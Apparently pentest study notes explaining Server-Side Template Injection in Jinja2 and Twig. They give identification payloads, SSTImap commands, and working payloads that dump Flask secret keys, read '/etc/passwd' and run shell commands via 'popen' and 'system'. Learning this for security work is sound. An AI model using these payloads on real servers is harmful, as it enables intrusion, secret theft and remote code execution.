# Template Engines
Web applications can utilize templating engines and server-side templates to generate responses such as HTML content dynamically. This generation is often based on user input, enabling the web application to respond to user input dynamically. 
An everyday use case for template engines is a website with shared headers and footers for all pages. A template can dynamically add content but keep the header and footer the same. This avoids duplicate instances of header and footer in different places, reducing complexity and thus enabling better code maintainability. Popular examples of template engines are [Jinja](https://jinja.palletsprojects.com/en/3.1.x/) and [Twig](https://twig.symfony.com/).
## Example
The following code contains a single variable called `name`, which is replaced with a dynamic value during rendering. When the template is rendered, the template engine must be provided with a value for the variable `name`. 
```jinja2
Hello {{ name }}!
```
The template engine simply replaces the variable in the template with the dynamic value provided to the rendering function.
- Hello vautia!
- Hello 21y4d!
- Hello Enoxia!
When an attacker can inject malicious template code, a [Server-Side Template Injection](https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server_Side_Template_Injection) vulnerability can occur.



# Identifying SSTI
Like w/ `SQLi`, we want to inject special characters to try to `break the template syntax`, and look for any webserver error. 
```bash
# Test strings for SSTI
${{<%[%'"}}%\.
```
- We need to `identify the template engine used` by the web app. The idea is to identify the behaviour of different template engines when inserting payloads
![image](https://academy.hackthebox.com/storage/modules/145/ssti/diagram.png)We will start by injecting the payload `${7*7}` and follow the diagram from left to right, depending on the result of the injection. Suppose the injection resulted in a successful execution of the injected payload. In that case, we follow the green arrow; otherwise, we follow the red arrow until we arrive at a resulting template engine.
```bash
# SSTI template engine identification payloads
${7*7}
{{7*7}}
a{*comment*}b
{{7*'7'}}
${"z".join("ab")}
```
If the code gets executed, then we have an SSTI !
## Automated Tools
- The most popular tool for identifying & exploiting SSTI vulnerabilities is [tplmap](https://github.com/epinna/tplmap), but he's not maintained and runs w/ `python2`.
- The tool [SSTImap](https://github.com/vladko312/SSTImap) is maintained and will help us to aid the SSTI exploitation process.
```bash
# Download & install
git clone https://github.com/vladko312/SSTImap
cd SSTImap
pip3 install -r requirements.txt

# Identify SSTI & template engine used
python3 sstimap.py -u http://172.17.0.2/index.php?name=test

# Download a remote file
python3 sstimap.py -u http://172.17.0.2/index.php?name=test -D '/etc/passwd' './passwd'

# RCE
python3 sstimap.py -u http://172.17.0.2/index.php?name=test -S id
```



# Exploiting SSTI
We could check `SSTI payloads` w/ the [PayloadsAllTheThings SSTI CheatSheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md)
## Jinja2
Jinja is a template engine commonly used in Python web frameworks such as `Flask` or `Django`. Here we'll focus on a `Flask` web application.
- We could dump the entire `web application configuration` & `source code`, including `secret keys`, 
```jinja2
{{ config.items() }}
```
- We can dump all `available built-in functions`
```jinja2
{{ self.__init__.__globals__.__builtins__ }}
```
- We can use `Python's` built-in function `open` to include a local file (`LFI`). However, we cannot call the function directly; we need to call it from the `__builtins__` dictionary we dumped earlier.
```jinja2
{{ self.__init__.__globals__.__builtins__.open("/etc/passwd").read() }}
```
- We can `RCE` using functions provided by the `os` library, such as `system` or `popen`. If the web application has not already imported this library, we must first import it by calling the built-in function `import`.
```jinja2
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```
## Twig
Twig is a template engine for the `PHP` programming language.
- We could use the `_self` keyword to obtain information about the current template
```twig
{{ _self }}
```
- Reading local files is not possible using internal functions directly provided by Twig. However, the `PHP` web framework [Symfony](https://symfony.com/) defines additional Twig filters. One of these filters is [file_excerpt](https://symfony.com/doc/current/reference/twig_reference.html#file-excerpt) and can be used to read local files
```twig
{{ "/etc/passwd"|file_excerpt(1,-1) }}
```
- We can `RCE` using `PHP` built-in function such as `system`. We can pass an argument to this function by using Twig's `filter` function
```twig
{{ ['id'] | filter('system') }}
```

